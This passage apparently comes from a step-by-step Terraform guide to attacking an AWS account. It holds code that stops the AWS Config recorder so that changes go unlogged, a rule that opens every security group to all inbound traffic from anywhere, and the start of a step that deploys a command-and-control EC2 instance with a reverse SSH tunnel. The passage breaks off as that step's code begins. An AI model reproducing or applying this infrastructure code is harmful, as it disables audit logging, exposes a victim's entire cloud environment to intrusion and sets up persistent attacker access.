  provisioner "local-exec" {
    command = "aws configservice stop-configuration-recorder --configuration-recorder-name <recorder-name>"
  }
}
```

### Step 4: Open Security Groups

Open all security groups. This is a very aggressive step and can have significant security implications.

```hcl
resource "aws_security_group_rule" "allow_all_ingress" {
  for_each = { for sg in data.aws_security_groups.all.ids : sg => sg }

  type              = "ingress"
  from_port         = 0
  to_port           = 0
  protocol          = "-1"
  cidr_blocks       = ["0.0.0.0/0"]
  security_group_id = each.value
}

data "aws_security_groups" "all" {
  filter {
    name   = "group-name"
    values = ["*"]
  }
}
```

### Step 5: Deploy C2 EC2 Instance with Reverse SSH Tunnel

Deploy an EC2 instance and establish a reverse SSH tunnel.

```hcl
